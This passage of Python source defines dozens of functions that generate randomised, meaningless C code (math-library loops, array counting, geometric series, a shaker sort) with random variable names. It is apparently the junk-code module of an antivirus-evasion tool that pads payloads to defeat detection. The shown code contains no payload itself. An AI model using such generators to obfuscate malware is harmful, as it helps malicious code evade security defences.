    junkcode += "int " + randvar + "," + randflag + "," + randvar2 + "," + randflag2 + ";"
    junkcode += "for(" + randflag + " = 1;" + randflag + " <= " + randranges + ";" + randflag + "++){"
    junkcode += randvar + " = 0;"
    junkcode += randvar2 + " = " + randflag + ";"
    junkcode += "while(" + randvar2 + " != 0){"
    junkcode += randflag2 + " = " + randvar2 + "%10;"
    junkcode += randvar + " += " + randflag2 + "*" + randflag2 + "*" + randflag2 + ";"
    junkcode += randvar2 + " = " + randvar2 + "/10;}"
    junkcode += "if(" + randvar + " == " + randflag + "){"
    junkcode += randLastArmN + " = " + randflag + ";}}"
    return junkcode


def odd_or_even_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    randodd = core.varname_creator()
    randeven = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int *" + randvar + " = (int*)malloc(sizeof(int)*" + randranges + ");"
    junkcode += "int " + randodd + " = 0;"
    junkcode += "int " + randeven + " = 0;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 100000;}"
    junkcode += randflag + " = " + "0;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += "if(" + randvar + "[" + randflag + "]&1){"
    junkcode += randodd + " += 1;"
    junkcode += "}else if(!(" + randvar + "[" + randflag + "]&1)){"
    junkcode += randeven + " += 1;}}"
    junkcode += "free(" + randvar + ");"
    return junkcode


def odd_or_even_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    randodd = core.varname_creator()
    randeven = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int *" + randvar + " = (int*)malloc(sizeof(int)*" + randranges + ");"
    junkcode += "int " + randodd + " = 0;"
    junkcode += "int " + randeven + " = 0;"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 1000;"
    junkcode += "if(" + randvar + "[" + randflag + "]&1){"
    junkcode += randodd + " += 1;"
    junkcode += "}else if(!(" + randvar + "[" + randflag + "]&1)){"
    junkcode += randeven + " += 1;}}"
    junkcode += "free(" + randvar + ");"
    return junkcode


def ceil_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "double *" + randvar2 + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar2 + "[" + randflag + "] = ceil(" + randvar + "[" + randflag + "]);}"
    return junkcode


def ceil_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + " = -1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "double *" + randvar2 + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);"
    junkcode += randvar2 + "[" + randflag + "] = ceil(" + randvar + "[" + randflag + "]);}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def floor_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "double *" + randvar2 + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar2 + "[" + randflag + "] = floor(" + randvar + "[" + randflag + "]);}"
    return junkcode


def floor_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randvar2 = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + " = -1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "double *" + randvar2 + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = (double)(rand() % 1000) / (double)(rand() % 70);"
    junkcode += randvar2 + "[" + randflag + "] = ceil(" + randvar + "[" + randflag + "]);}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def acos_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = acos(" + randvar + "[" + randflag + "]);}"
    return junkcode


def acos_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);"
    junkcode += randvar + "[" + randflag + "] = acos(" + randvar + "[" + randflag + "]);}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def asin_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randflag = core.varname_creator()
    randvar = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = asin(" + randvar + "[" + randflag + "]);}"
    return junkcode


def asin_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);"
    junkcode += randvar + "[" + randflag + "] = asin(" + randvar + "[" + randflag + "]);}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def atan_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = ((double)rand() / (double)(RAND_MAX));}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = atan(" + randvar + "[" + randflag + "]);}"
    return junkcode


def atan_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = ((double)rand() / (double)(RAND_MAX));"
    junkcode += randvar + "[" + randflag + "] = atan(" + randvar + "[" + randflag + "]);}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def fabs_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = fabs(" + randvar + "[" + randflag + "]);}"
    return junkcode


def fabs_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = (double)((2*(rand() / (double)(RAND_MAX))) - (double)1);"
    junkcode += randvar + "[" + randflag + "] = fabs(" + randvar + "[" + randflag + "]);}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def exp_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double " + randvar + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + " = exp((double)(" + str(randint(2, 10)) + "*rand() / (double)(RAND_MAX)));}"
    return junkcode


def exp_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double " + randvar + ";"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + " = exp((double)(" + str(randint(2, 10)) + "*rand() / (double)(RAND_MAX)));}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def ln_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double " + randvar + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + " = log((double)(" + str(randint(20, 1000)) + "*rand() / (double)(RAND_MAX)));}"
    return junkcode


def ln_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double " + randvar + ";"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + " = log((double)(" + str(randint(20, 1000)) + "*rand() / (double)(RAND_MAX)));}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def log10_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double " + randvar + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + " = log((double)(" + str(randint(20, 1000)) + "*rand() / (double)(RAND_MAX)));}"
    return junkcode


def log10_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double " + randvar + ";"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + " = log((double)(" + str(randint(20, 1000)) + "*rand() / (double)(RAND_MAX)));}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def fmod_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = ((double)rand() / (double)(RAND_MAX));}"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = fmod(" + randvar + "[" + randflag + "],(double)(rand() % 100));}"
    return junkcode


def fmod_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    junkcode = "int " + randflag + "=-1;"
    junkcode += "double *" + randvar + " = (double*)malloc(sizeof(double)*" + randranges + ");"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randvar + "[" + randflag + "] = ((double)rand() / (double)(RAND_MAX));"
    junkcode += randvar + "[" + randflag + "] = fmod(" + randvar + "[" + randflag + "],(double)(rand() % 100));}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def ldexp_routine_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    randinteger = core.varname_creator()
    junkcode = "int " + randinteger + ";"
    junkcode += "int " + randflag + ";"
    junkcode += "double " + randvar + ";"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randinteger + " = rand() % " + str(randint(16, 32)) + ";"
    junkcode += randvar + " = ldexp((double)(rand() / (double)(RAND_MAX))," + randinteger + ");}"
    return junkcode


def ldexp_routine_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randvar = core.varname_creator()
    randflag = core.varname_creator()
    randinteger = core.varname_creator()
    junkcode = "int " + randinteger + ";"
    junkcode += "int " + randflag + "=-1;"
    junkcode += "double " + randvar + ";"
    junkcode += "do{"
    junkcode += randflag + "++;"
    junkcode += randinteger + " = rand() % " + str(randint(16, 32)) + ";"
    junkcode += randvar + " = ldexp((double)(rand() / (double)(RAND_MAX))," + randinteger + ");}while(" + randflag + " < " + randranges + "-1);"
    return junkcode


def geometric_1(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randflag = core.varname_creator()
    randdiv = core.varname_creator()
    junkcode = "double " + randsum + "=0;"
    junkcode += "double " + randdiv + "=1;"
    junkcode += "for(int " + randflag + "=0;" + randflag + " < " + randranges + ";" + randflag + "++){;"
    junkcode += randdiv + "=" + randdiv + "*2;"
    junkcode += randsum + " = " + randsum + " + (1 / " + randdiv + ");"
    junkcode += "if(" + randsum + " == 1.00)break;}"
    return junkcode


def geometric_2(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randflag = core.varname_creator()
    randdiv = core.varname_creator()
    junkcode = "double " + randsum + "=0;"
    junkcode += "double " + randdiv + "=1;"
    junkcode += "int " + randflag + "=0;"
    junkcode += "do{"
    junkcode += randflag + " += 1;"
    junkcode += randdiv + "=" + randdiv + "* 2;"
    junkcode += randsum + " = " + randsum + " + (1 / " + randdiv + ");"
    junkcode += "if(" + randsum + " == 1.00)break;}while(" + randflag + " < " + randranges + ");"
    return junkcode


def geometric_3(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randosum = str(uniform(1.11111111111111111111, 1.9999999999999999999))
    randflag = core.varname_creator()
    randdiv = core.varname_creator()
    junkcode = "double " + randsum + "=0;"
    junkcode += "double " + randdiv + "=1;"
    junkcode += "for(int " + randflag + "=0;" + randflag + " < " + randranges + ";" + randflag + "++){;"
    junkcode += randsum + " = " + randsum + " + (1 / " + randdiv + ");"
    junkcode += randdiv + " *= 4;"
    junkcode += "if(" + randsum + " == " + randosum + ")break;}"
    return junkcode


def geometric_4(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randosum = str(uniform(1.11111111111111111111, 1.9999999999999999999))
    randflag = core.varname_creator()
    randdiv = core.varname_creator()
    junkcode = "double " + randsum + "=0;"
    junkcode += "double " + randdiv + "=1;"
    junkcode += "int " + randflag + "=0;"
    junkcode += "do{"
    junkcode += randflag + " += 1;"
    junkcode += randsum + " = " + randsum + " + (1 / " + randdiv + ");"
    junkcode += randdiv + "*=4;"
    junkcode += "if(" + randsum + " == " + randosum + ")break;}while(" + randflag + " < " + randranges + ");"
    return junkcode


def geometric_5(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randsum = core.varname_creator()
    randosum = str(uniform(0.11111111111111111111, 0.9999999999999999999))
    randflag = core.varname_creator()
    randdiv = core.varname_creator()
    junkcode = "double " + randsum + "=0;"
    junkcode += "double " + randdiv + "=1;"
    junkcode += "for(int " + randflag + "=0;" + randflag + " < " + randranges + ";" + randflag + "++){;"
    junkcode += randdiv + " *= 4;"
    junkcode += randsum + " = " + randsum + " + (1 / " + randdiv + ");"
    junkcode += "if(" + randsum + " == " + randosum + ")break;}"
    return junkcode


def shaker_snort(H):
    XH1 = randint(8, 16)
    XH2 = randint(50, 120)
    randranges = str(randint(XH1 * H, XH2 * H))
    randflag = core.varname_creator()
    randflag2 = core.varname_creator()
    randtemp = core.varname_creator()
    randvar = core.varname_creator()
    junkcode = "int " + randflag + ";"
    junkcode += "int *" + randvar + " = (int*)malloc(sizeof(int)*" + randranges + ");"
    junkcode += "for(" + randflag + " = 0;" + randflag + " < " + randranges + ";" + randflag + "++){"
    junkcode += randvar + "[" + randflag + "] = rand() % 10000;}"
    junkcode += "int " + randflag2 + ";"
    junkcode += "int " + randtemp + ";"
    junkcode += "for (" + randflag2 + " = 1; " + randflag2 + " <= " + randranges + " / 2; " + randflag2 + "++){"
    junkcode += "for (" + randflag + " = " + randflag2 + " - 1; " + randflag + " < " + randranges + " - " + randflag2 + "; " + randflag + "++){"
    junkcode += "if (" + randvar + "[" + randflag + "] > " + randvar + "[" + randflag + "+1]){"
    junkcode += randtemp + " = " + randvar + "[" + randflag + "];"
    junkcode += randvar + "[" + randflag + "] = " + randvar + "[" + randflag + "+1];"
    junkcode += randvar + "[" + randflag + "+1] = " + randtemp + ";}}"
    junkcode += "for (" + randflag + " = " + randranges + " - " + randflag2 + " - 1; " + randflag + " >= " + randflag2 + "; " + randflag + "--){"
    junkcode += "if (" + randvar + "[" + randflag + "] < " + randvar + "[" + randflag + "-1]){"
    junkcode += randtemp + " = " + randvar + "[" + randflag + "];"
    junkcode += randvar + "[" + randflag + "] = " + randvar + "[" + randflag + "-1];"
    junkcode += randvar + "[" + randflag + "-1] = " + randtemp + ";}}}"
    return junkcode
